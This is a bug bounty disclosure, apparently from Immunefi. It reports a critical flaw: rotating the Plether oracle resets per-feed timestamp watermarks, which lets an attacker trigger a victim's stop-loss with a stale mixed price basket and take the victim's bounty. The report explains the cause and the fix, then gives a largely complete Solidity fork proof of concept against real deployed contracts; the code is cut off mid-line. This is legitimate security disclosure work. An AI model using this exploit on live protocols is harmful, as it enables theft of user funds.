# #98014 [CRITICAL]

Source: https://reports.immunefi.com/plether/98014-sc-critical-oracle-rotation-resets-accepted-per-feed-watermarks

Description
Summary
PletherOracle stores accepted per-feed timestamps inside each oracle instance. Timelocked rotation copies the active oracle's six policy fields into a fresh candidate but transfers none of its accepted component watermarks. The first caller after rotation can therefore combine a previously superseded signed component with a newer component, pass the Engine's aggregate timestamp check, and consume the regressed basket atomically.
Description
Every accepted live basket normally enforces two layers of ordering:
- each component must be at least as new as that feed's previously accepted timestamp; and
- the basket's newest component timestamp must not precede the Engine mark.
The per-feed protection is conditional on the oracle-local hasAcceptedBasket flag ( src/PletherOracle.sol:762-800 ):
if (hasAcceptedBasket & & feedTime < _acceptedPrices[i].publishTime) {
revert PletherOracle__FeedTimeOutOfOrder(
pythFeedIds[i], feedTime, _acceptedPrices[i].publishTime
);
}
Oracle rotation preserves policy only. applyOracleConfig() reads the six mutable policy fields from the active oracle, applies them to the candidate, verifies the result, and returns. It does not read or initialize hasAcceptedBasket , _acceptedPrices , or _acceptedBasket ( src/router/OrderLiquidationBatchLogic.sol:514-529 ). The Router then installs the fresh candidate.
The candidate cannot be initialized through the supported Router path before activation: all Router price actions still call the currently configured oracle, while the candidate itself accepts price updates only from the Engine's Router. Consequently, a fresh rotation necessarily exposes an uninitialized first-update boundary unless governance can atomically bundle finalization with a valid bootstrap action.
On that first update, the per-feed check is skipped. The only cross-instance continuity check is in _snapshotFromBasket() , which compares the basket's newest component timestamp with engine.lastMarkTime() ( src/PletherOracle.sol:883-902 ). One component newer than the old Engine mark can therefore mask another component that regresses behind the timestamp previously accepted for that feed.
The fork PoC uses authentic signed Pyth messages at these timestamps:
Old accepted timestamp for every feed: 1790091390
Regressed timestamps for feeds 1-5: 1790091384
New timestamp for feed 0: 1790091391
All six observations are inside the 15-second live lookback and liquidation/mark-refresh divergence allowance at the fixture block. Before rotation, the mixed payload reverts because 1790091384 < 1790091390 . After rotation, the fresh candidate accepts the same signed observations because it has no accepted state; the aggregate timestamp is 1790091391 , which advances the Engine mark.
The authentic coherent basket at timestamp 1790091391 has mark 0.97668761 . The regressed mixed basket has mark 0.97668281 . A SHORT trader has legitimately placed a stop-loss at 0.97668500 , between those values. The coherent basket does not trigger it. The post-rotation mixed basket does.
triggerPositionProtection() processes the price and protection activation atomically. Once met, it consumes the victim's reserved trigger bounty, creates a binding full-position close order, and credits the caller through engine.creditBounty() ( src/router/OrderLiquidationBatchLogic.sol:585-619 ). The victim cannot cancel or replace a triggered protection. A later honest oracle update cannot undo the bounty transfer or remove the queued close attempt.
Impact Severity
Critical
The PoC proves an immediate attacker-controlled transfer from the victim's reserved settlement balance. The victim voluntarily reserved that value only for a valid protection trigger; the attacker obtains it by bypassing the accepted per-feed ordering invariant during rotation. This directly matches the listed Critical impact, Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield . The same transaction also forces the victim into a binding full-position close lifecycle at a mark the pre-rotation oracle rejected.
Why This Is Valid and Not a Known Issue
This report proves that the pinned MED-7 mitigation is incomplete. MED-7's published resolution says complete signed baskets are now required and “accepted component timestamps cannot move backward,” while acknowledging only that a caller may choose an older valid component that has not already been superseded on-chain. The rotation path erases the implemented per-feed watermark and permits an observation older than the timestamp already accepted for that exact feed. The PoC submits identical guardian-signed data on both sides of rotation: the fixed active oracle rejects it with PletherOracle__FeedTimeOutOfOrder , while the fresh candidate accepts it and transfers the victim's bounty. This is the competition's express incomplete-fix exception, not the acknowledged residual selection behavior. MED-13 is also distinct: it concerns governance rotation changing which oracle evaluates an armed protection, whereas this root is loss of accepted per-feed ordering state across otherwise legitimate rotation.
Remediation
Preserve an oracle-independent component-time floor across rotation.
For every candidate first basket, require each component timestamp to be at least engine.lastMarkTime() before accepting it. This provides safe continuity even when the candidate changes feed identifiers and is stricter than comparing only the basket's maximum timestamp.
When feed identifiers are retained, additionally copy the old oracle's accepted timestamps into the candidate through a Router-only one-time initialization method. The strongest design is to bootstrap the candidate with a complete validated basket and install its resulting mark atomically during finalization, leaving no public uninitialized interval.
Proof of Concept
This fork PoC uses:
- the real Arbitrum Sepolia Pyth deployment at 0x0B73614636C855Bf23F342F307FB981A3e47f42B ;
- authentic guardian-signed six-feed accumulator messages already committed in the repository;
- the exact release feed IDs, weights, base prices, and inversion flags;
- production PletherOracle , OrderRouter , protection, Engine, clearinghouse, and HousePool implementations; and
- a production V3 order and the real protection-trigger path.
No oracle or in-scope contract is mocked, no in-scope storage is written through cheatcodes, and no fabricated price is supplied. The repository's standard six-decimal USDG test collateral is used only to fund the local trader and is expressly permitted by the competition rules.
The PoC derives a one-feed accumulator subset without changing its signed price message, Merkle proof, or guardian-signed root. The real Pyth contract verifies the resulting payload on the fork.
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;
import { BasePerpTest } from "../../packages/perps/test/perps/BasePerpTest.sol" ;
import { LegacyOrderRouterHarness } from "../../packages/perps/test/utils/LegacyOrderRouterHarness.sol" ;
import { ArbitrumSepoliaReleaseOracle } from "../../script/DeployPerpsArbitrumSepolia.s.sol" ;
import { CfdOrderPolicyEvaluator } from "@plether/perps/CfdOrderPolicyEvaluator.sol" ;
import { OrderLifecycleBook } from "@plether/perps/OrderLifecycleBook.sol" ;
import { OrderRouter } from "@plether/perps/OrderRouter.sol" ;
import { OrderRouterExecutionSidecar } from "@plether/perps/OrderRouterExecutionSidecar.sol" ;
import { OrderRouterLiquidationBatchSidecar } from "@plether/perps/OrderRouterLiquidationBatchSidecar.sol" ;
import { CfdTypes } from "@plether/perps/CfdTypes.sol" ;
import { OrderV3Types } from "@plether/perps/OrderV3Types.sol" ;
import { IOrderRouterAdminHost } from "@plether/perps/interfaces/IOrderRouterAdminHost.sol" ;
import { IPletherOracle } from "@plether/perps/interfaces/IPletherOracle.sol" ;
import { IPositionProtectionActions } from "@plether/perps/interfaces/IPositionProtectionActions.sol" ;
import { IPositionProtectionBook } from "@plether/perps/interfaces/IPositionProtectionBook.sol" ;
import { PositionProtectionTypes } from "@plether/perps/interfaces/PositionProtectionTypes.sol" ;
import { IOrderRouterErrors } from "@plether/perps/interfaces/IOrderRouterErrors.sol" ;
import { IPyth } from "@plether/shared/interfaces/IPyth.sol" ;
import { ArbitrumForkSupport } from "@plether/test-utils/ArbitrumForkSupport.sol" ;
contract OracleRotationRealPythForkPoC is BasePerpTest {
string internal fixture;
string internal uneven;
address internal realPyth;
bytes32 [] internal ids;
ArbitrumSepoliaReleaseOracle internal oldOracle;
ArbitrumSepoliaReleaseOracle internal candidate;
address internal constant TRADER = address ( 0xA11CE );
address internal constant ATTACKER = address ( 0xBAD );
uint256 internal constant POSITION_SIZE = 100_000e18 ;
uint256 internal constant STOP_LOSS = 97_668_500 ;
function setUp ( ) public override {
fixture = vm.readFile( "test/fixtures/oracle-sync/live-watermark-sep22.json" );
uneven = vm.readFile( "test/fixtures/oracle-sync/live-watermark-uneven.json" );
uint256 forkNumber = vm.parseJsonUint(fixture, ".forkBlockNumber" );
vm.createSelectFork(vm.envString( "ARB_SEPOLIA_RPC_URL" ), forkNumber);
ArbitrumForkSupport.install();
realPyth = vm.parseJsonAddress(fixture, ".pyth" );
ids = vm.parseJsonBytes32Array(fixture, ".feedIds" );
vm.warp(SETUP_TIMESTAMP);
super .setUp();
oldOracle = _newReleaseOracle();
routerAdmin.proposeOracleConfig(IOrderRouterAdminHost.OracleConfig( address (oldOracle)));
vm.warp(routerAdmin.oracleConfigActivationTime());
routerAdmin.finalizeOracleConfig();
pletherOracle = oldOracle;
candidate = _newReleaseOracle();
routerAdmin.proposeOracleConfig(IOrderRouterAdminHost.OracleConfig( address (candidate)));
vm.deal( address ( this ), 10 ether );
}
function test_RealSignedRotationAcceptsPreviouslyRejectedRegression ( ) public {
uint256 initialTime = vm.parseJsonUintArray(fixture, ".updates.initial.publishTimes" )[ 0 ];
uint256 nextTime = vm.parseJsonUintArray(fixture, ".updates.next.publishTimes" )[ 0 ];
uint256 skippedTime = vm.parseJsonUintArray(fixture, ".updates.skipped.publishTimes" )[ 0 ];
uint256 laggingTime = vm.parseJsonUintArray(uneven, ".updates.lagging.publishTimes" )[ 0 ];
uint256 forkTime = vm.parseJsonUint(fixture, ".forkTimestamp" );
bytes [] memory next = _fullData( "next" );
bytes [] memory honest = _fullData( "skipped" );
bytes [] memory mixed = _mixedAttackData();
_fundTrader(TRADER, 10_000e6 );
_openSignedShort(initialTime);
vm.warp(forkTime);
router.updateMarkPrice{ value : oldOracle.getUpdateFee(next)}(next);
assertEq(engine.lastMarkTime(), nextTime);
uint256 nextMark = engine.lastMarkPrice();
uint256 [] memory oldTimes = oldOracle.getAcceptedFeedPublishTimes();
for ( uint256 i; i < ids. length ; + + i) assertEq(oldTimes[i], nextTime);
assertTrue(oldOracle.hasAcceptedBasket());
IPositionProtectionActions protectionActions =
IPositionProtectionActions( address (router.positionProtectionBook()));
PositionProtectionTypes.CloseFinancialLimits memory limits = PositionProtectionTypes.CloseFinancialLimits({
maxExecutionNotionalAssets: type ( uint256 ). max ,
maxGrossAccountDebitAssets: type ( uint256 ). max ,
maxActionChargeAssets: type ( uint256 ). max ,
maxExplicitFeesAssets: type ( uint256 ). max
});
vm.prank(TRADER);
uint64 protectionId = protectionActions.createPositionProtection(
PositionProtectionTypes.PositionProtectionParams({
takeProfitTriggerPrice: 0 , stopLossTriggerPrice: STOP_LOSS, closeLimits: limits
})
);
vm.roll(vm.getBlockNumber() + 1 );
uint256 honestFee = oldOracle.getUpdateFee(honest);
vm.prank(ATTACKER);
vm.expectRevert(IOrderRouterErrors.OrderRouter__TriggerNotMet. selector );
protectionActions.triggerPositionProtection{ value : honestFee}(protectionId, honest);
uint256 mixedFee = oldOracle.getUpdateFee(mixed);
vm.expectRevert(
abi . encodeWithSelector (
IPletherOracle.PletherOracle__FeedTimeOutOfOrder. selector , ids[ 1 ], laggingTime, nextTime
)
);
router.updateMarkPric
